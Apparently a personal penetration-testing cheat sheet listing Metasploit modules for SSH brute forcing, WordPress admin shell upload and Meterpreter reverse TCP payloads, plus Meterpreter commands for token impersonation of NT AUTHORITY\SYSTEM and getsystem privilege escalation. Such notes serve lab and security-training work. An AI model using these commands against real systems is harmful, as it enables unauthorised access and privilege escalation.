```bash
post/multi/recon/local_exploit_suggester #exploit suggestor
auxiliary/scanner/ssh/ssh_login #ssh bruteforce
unix/webapp/wp_admin_shell_upload #upload shell to wordpress if have login of admin 

#payloads
opsystem/meterpreter/reverse_tcp # staged payload may fail 
opsystem/meterpreter_reverse_tcp # not staged works better
```
###### Get user identification 
`meterpreter> getuid`
###### Potatos 
`meterpreter> load incognito`
`meterpreter> list_tokens -u`
`meterpreter> impersonate_token "NT AUTHORITY\SYSTEM"`

#impersonation #dublication
`meterpreter> getsystem -h`